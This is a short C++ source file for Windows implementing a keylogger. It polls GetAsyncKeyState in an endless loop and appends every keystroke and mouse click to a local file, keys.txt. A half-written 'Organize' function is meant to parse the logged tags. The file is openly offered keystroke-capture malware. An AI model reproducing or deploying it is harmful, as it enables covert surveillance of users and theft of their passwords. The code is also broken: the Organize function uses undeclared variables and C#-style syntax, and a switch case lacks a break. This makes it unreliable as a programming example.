#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream> 

using namespace std;
void Logging();

int main(){
    Logging();
}

//Get num lock
//Way to organize
void Logging(){
    char c;
    while (true)
    {
        for(c = 0; c <= 254; c++){
            if(GetAsyncKeyState(c) & 0x1)
            {
                ofstream log;
                log.open("keys.txt", ios::app);
                switch (c) {
                    case VK_BACK:
                        log << "[backspace]";//delete characters
                        break;
                    case VK_RETURN:
                        log << "\n";//go to next line
                        break;
                    case VK_SHIFT:
                        log << "[shift]";
                        break;
                    case VK_CONTROL:
                        log << "[control]";
                        break;
                    case VK_CAPITAL:
                        log << "[cap]";
                        break;
                    case VK_TAB:
                        log << "[tab]";
                        break;
                    case VK_MENU:
                        log << "[alt]";
                    case VK_LBUTTON:
                        log << "[lc]\n";
                        break;
                    case VK_RBUTTON:
                        log << "[rc]\n";
                        break;
                    default:
                        log << c;
                }
                log.close();
            }
        }
    }
}

void Organize(){
    log.open("keys.txt", ios::app);
    for(char c in log)
    {
        if(c == '['){
            int si = log.IndexOf(c);
        }
        if(c == "]"){
            int ei = log.IndexOf(c);
        }
        if(si < ei){
            //put everything from [ to ] and figure out what it means. ex: delete, cap, etc
        }
    }
    Logging();
}